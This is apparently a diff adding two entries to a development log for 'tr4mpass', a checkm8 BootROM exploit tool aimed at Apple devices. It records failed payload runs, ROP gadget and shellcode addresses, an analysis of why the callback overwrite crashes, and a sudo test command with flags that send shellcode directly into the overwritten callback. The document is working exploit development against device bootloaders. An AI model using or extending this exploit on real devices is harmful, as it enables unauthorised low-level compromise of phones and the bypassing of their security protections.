@@ -2465,3 +2465,65 @@ callbacks[2..5]: func=ret_gadget, arg=0
 
 
 
+
+---
+
+## v1.0.51 — RESULT (2026-06-14)
+
+```
+version 1.0.51  SKIP_MMU  exec_addr=0x1800B0610 (raw, no TTBR0 remap)
+send_payload_chunks: actual=1624 TIMED_OUT
+Direct read: [43 40 55 14 07 64] (6 bytes garbage) — EP0 locked
+Bus-reset verify: CPID:8010... (98 bytes, serial re-initialized)
+```
+
+**STILL no PWND even with SKIP_MMU.**
+
+### Definitive conclusion:
+- Crash is NOT in write_ttbr0 or tlbi (those were bypassed).
+- Crash is in the `nop_gadget → func_gadget` dispatch chain.
+- `func_gadget` reads `[x0+0x70]` to get (arg,func) but x0 may not be
+  `insecure_memory_base` — it's whatever the BootROM passes as first arg.
+- If x0 = some other value, `func_gadget` reads garbage and calls 0 → crash.
+
+### Root cause hypothesis:
+The `func_gadget` at `0x10000CC4C` reads arg/func from `[x0+0x70]`. We assume
+x0 = insecure_memory_base when func_gadget is called. But x0 might be the
+freed io_request struct pointer (heap address), not insecure_memory_base.
+
+If that's the case, our block1 data (at buf[0x70] = insecure_mem+0x70) is
+never found because func_gadget reads [heap_ptr+0x70] which is unrelated memory.
+
+---
+
+## v1.0.52 — DIRECT_EXEC isolation test (2026-06-14)
+
+### New isolation: bypass ROP chain entirely.
+
+`CHECKM8_DIRECT_EXEC=1` puts exec_addr directly into the overwrite `callback`
+field. The BootROM calls `callback(struct_ptr)` → shellcode runs immediately,
+no nop_gadget, no func_gadget, no TTBR0 swap.
+
+Also combine with `CHECKM8_DIAG_SHELLCODE=1` and `CHECKM8_SKIP_MMU=1` (though
+SKIP_MMU doesn't affect the overwrite in DIRECT_EXEC mode).
+
+### Test:
+```bash
+git pull origin comp-changes && make
+
+# DIRECT_EXEC + DIAG: callback=exec_addr directly, no ROP chain
+sudo CHECKM8_DIRECT_EXEC=1 CHECKM8_DIAG_SHELLCODE=1 ./tr4mpass
+```
+
+### Expected log:
+```
+DIRECT_EXEC: exec_addr=0x1800B0610 (raw SRAM)
+build_overwrite_64: DIRECT_EXEC callback=0x1800B0610
+```
+
+### Interpretation:
+- PWND appears → func_gadget offset was wrong, overwrite callback mechanism works
+- Still no PWND → overwrite callback mechanism itself broken on Linux
+  (overwrite may not land correctly, or BootROM calls callback differently)
+
+### Commit: ef560be
